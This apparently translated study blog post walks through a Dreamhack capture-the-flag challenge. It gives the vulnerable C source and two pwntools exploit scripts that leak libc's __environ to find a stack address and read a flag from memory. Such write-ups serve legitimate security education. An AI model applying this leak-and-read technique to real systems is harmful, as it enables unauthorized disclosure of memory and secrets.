---
title: "[PWNABLE] environ stack leak"
description: "Stack address using __environ leak__environ is one of the environment variables that contains system information (referenced by execve series functions). You can find the symbol in the libc file. This is a confirmation of the value contained in the environ. You can also see that the relevant parts belong to the stack area. my overall"
date: "2024-06-24"
translation_key: "tistory-8beaf703795a"
tags: ["STUDY/PWNABLE_AMD64"]
category: "STUDY/PWNABLE_AMD64"
source_url: "https://whrdud727.tistory.com/entry/PWNABLE-environ-stack-leak"
private: false
---

### Stack address leak using \_\_environ

\_\_environ is one of the environment variables and contains system information.

(Referred to by the execve series of functions.)

![](/assets/images/tistory/tistory-8beaf703795a/001.png)

You can find the symbol in the libc file.

![](/assets/images/tistory/tistory-8beaf703795a/002.png)

![](/assets/images/tistory/tistory-8beaf703795a/003.png)

This is a confirmation of the value contained in the environ.

![](/assets/images/tistory/tistory-8beaf703795a/004.png)

You can also see that the relevant parts belong to the stack area.

![](/assets/images/tistory/tistory-8beaf703795a/005.png)

This is the overall content.

![](/assets/images/tistory/tistory-8beaf703795a/006.png)

It seems to be called and used when \_init() is executed.

* * *

#### dreamhack - \_\_envirion

```
#include <fcntl.h>
#include <stdio.h>
#include <unistd.h>
#include <signal.h>
#include <stdlib.h>

void sig_handle() {
  exit(0);
}
void init() {
  setvbuf(stdin, 0, 2, 0);
  setvbuf(stdout, 0, 2, 0);

  signal(SIGALRM, sig_handle);
  alarm(5);
}

void read_file() {
  char file_buf[4096];

  int fd = open("./flag", O_RDONLY);
  read(fd, file_buf, sizeof(file_buf) - 1);
  close(fd);
}
int main() {
  char buf[1024];
  long addr;
  int idx;

  init();
  read_file();

  printf("stdout: %p\n", stdout);

  while (1) {
    printf("> ");
    scanf("%d", &idx);
    switch (idx) {
      case 1:
        printf("Addr: ");
        scanf("%ld", &addr);
        printf("%s", (char *)addr);
        break;
      default:
        break;
    }
  }
  return 0;
}
```

When you run the file, the stdout library address is output as shown below.

![](/assets/images/tistory/tistory-8beaf703795a/007.png)

Then, repeatedly enter the value into the address of the variable called addr.

Since the address of stdout has been leaked, libc\_base can be obtained.

Through this, even \_\_environ can be obtained.

Since the value pointed to by addr continues to be output, the address must be made to point to ./flag.

```
from pwn import*

p = process(['./environ'],env={'LD_PRELOAD':'./libc.so.6'})
e = ELF('./environ')
libc = ELF('./libc.so.6')

context.log_level = 'debug'

p.recvuntil(b": ")
stdout = int(p.recvn(14),16)

stdout_offset = libc.sym['_IO_2_1_stdout_']
environ_offset = libc.sym['__environ']

libc_base = stdout-stdout_offset
environ = libc_base + environ_offset

print("stdout@add : ",hex(stdout))
print("libc_base@add : ",hex(libc_base))
print("environ@add : ", hex(environ))
p.interactive()
```

This is a payload draft that obtains the addresses of libc\_base and environ.

Now we need to find the stack gap using the read\_file function that reads the flag file.

![](/assets/images/tistory/tistory-8beaf703795a/008.png)

This is the part that opens the file and reads its contents.

You can see that the objects to be read are in the rsi and rcx registers.

![](/assets/images/tistory/tistory-8beaf703795a/009.png)

This is currently confirmed information.

If you subtract the low address from the high address, you get a difference of 0x1568.

![](/assets/images/tistory/tistory-8beaf703795a/010.png)

First, leak the value contained in the address of the environ obtained,

You must set it by pointing to the address in rsi.

This is the modified code.

```
from pwn import*

p = process(['./environ'],env={'LD_PRELOAD':'./libc.so.6'})
e = ELF('./environ')
libc = ELF('./libc.so.6')

context.log_level = 'debug'

p.recvuntil(b": ")
stdout = int(p.recvn(14),16)

stdout_offset = libc.sym['_IO_2_1_stdout_']
environ_offset = libc.sym['__environ']

libc_base = stdout-stdout_offset
environ = libc_base + environ_offset

print("stdout@add : ",hex(stdout))
print("libc_base@add : ",hex(libc_base))
print("environ@add : ", hex(environ))

p.sendlineafter(b">",b"1")
p.sendlineafter(b":",str(environ))
p.recvuntil('\x20')

environ_val = u64(p.recvn(6).ljust(8,b'\x00'))
print("environ_val : ",hex(environ_val))

flag_add = environ_val - 0x1568
print("flag_add : ",flag_add)

p.sendlineafter(b">",b"1")
p.sendlineafter(b":",str(flag_add))
p.interactive()
```

![](/assets/images/tistory/tistory-8beaf703795a/011.png)

When you run it, you can see the flag being output.